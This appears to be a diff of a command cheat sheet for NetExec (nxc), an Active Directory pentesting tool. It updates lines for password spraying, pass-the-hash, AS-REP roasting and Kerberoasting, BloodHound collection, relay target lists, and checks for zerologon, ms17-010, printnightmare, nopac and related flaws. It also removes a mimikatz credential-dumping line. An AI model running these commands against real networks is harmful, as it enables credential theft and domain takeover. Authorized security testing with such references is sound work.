@@ -3,44 +3,42 @@ netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
 netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
 netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
 netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
-netexec smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
-netexec smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
-netexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_avproducts
-netexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M mimikatz
-netexec smb "$TARGET" -u '' -p '' --pass-pol
+netexec ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dns-server "$DC_HOST" --bloodhound --collection All 
 netexec smb "$RANGE" --gen-relay-list smb_targets.txt
 netexec smb "$RANGE" --local-auth -u '' -p ''
 netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --loggedon-users
 netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --sessions
 netexec smb "$RANGE" -u "$USER" -p "$PASSWORD" --shares
 netexec smb "$RANGE" -u '' -p '' --shares
-netexec smb "$TARGET" -u "$USER" -p "$PASSWORD" -M noPac
-netexec smb "$TARGET" -u "$USER" -p "$PASSWORD" -M petitpotam
-netexec smb "$TARGET" -u '' -p '' -M zerologon
-netexec smb "$TARGET" -u '' -p '' -M ms17-010
+netexec smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
+netexec smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
+netexec smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_av
+netexec smb "$TARGET" -u '' -p '' --pass-pol
+netexec smb "$TARGET" -u "$USER" -p "$PASSWORD" -M coerce_plus -M ntlm_reflection -M nopac
+netexec smb "$TARGET" -M ms17-010 -M printnightmare -M remove-mic -M smbghost -M zerologon
 netexec smb "$TARGET" -u '' -p '' -M ioxidresolver
-nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" --shares
-netexec smb "$TARGET" -u '' -p '' --generate-hosts-file hosts
-netexec smb --list-modules
+netexec smb "$TARGET" -u "$USER" -p "$PASSWORD" --shares
+netexec smb "$TARGET" --generate-hosts-file hosts
+netexec smb "$TARGET" --generate-krb5-file /tmp/krb5.conf && export KRB5_CONFIG=/tmp/krb5.conf
+nxc smb --list-modules
 nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" -M maq
 nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD"
 nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --asreproast ASREProastables.txt --kdcHost "$DC_HOST"
 nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --kerberoasting Kerberoastables.txt --kdcHost "$DC_HOST"
-nxc smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
-nxc smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
-nxc smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_avproducts
-nxc smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M mimikatz
-nxc smb "$TARGET" -u '' -p '' --pass-pol
+nxc ldap "$DC_HOST" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" --dns-server "$DC_HOST" --bloodhound --collection All 
 nxc smb "$RANGE" --gen-relay-list smb_targets.txt
 nxc smb "$RANGE" --local-auth -u '' -p ''
 nxc smb "$RANGE" -u "$USER" -p "$PASSWORD" --loggedon-users
 nxc smb "$RANGE" -u "$USER" -p "$PASSWORD" --sessions
 nxc smb "$RANGE" -u "$USER" -p "$PASSWORD" --shares
 nxc smb "$RANGE" -u '' -p '' --shares
-nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" -M noPac
-nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" -M petitpotam
-nxc smb "$TARGET" -u '' -p '' -M zerologon
-nxc smb "$TARGET" -u '' -p '' -M ms17-010
+nxc smb "$TARGET" --continue-on-success --no-bruteforce -u users.txt -p passwords.txt
+nxc smb "$TARGET" --continue-on-success -u users.txt -p passwords.txt
+nxc smb "$TARGET" --local-auth -u "$USER" -H "$NT_HASH" -M enum_av
+nxc smb "$TARGET" -u '' -p '' --pass-pol
+nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" -M coerce_plus -M ntlm_reflection -M nopac
+nxc smb "$TARGET" -M ms17-010 -M printnightmare -M remove-mic -M smbghost -M zerologon
 nxc smb "$TARGET" -u '' -p '' -M ioxidresolver
 nxc smb "$TARGET" -u "$USER" -p "$PASSWORD" --shares
-nxc smb "$TARGET" -u '' -p '' --generate-hosts-file hosts
+nxc smb "$TARGET" --generate-hosts-file hosts
+nxc smb "$TARGET" --generate-krb5-file /tmp/krb5.conf && export KRB5_CONFIG=/tmp/krb5.conf
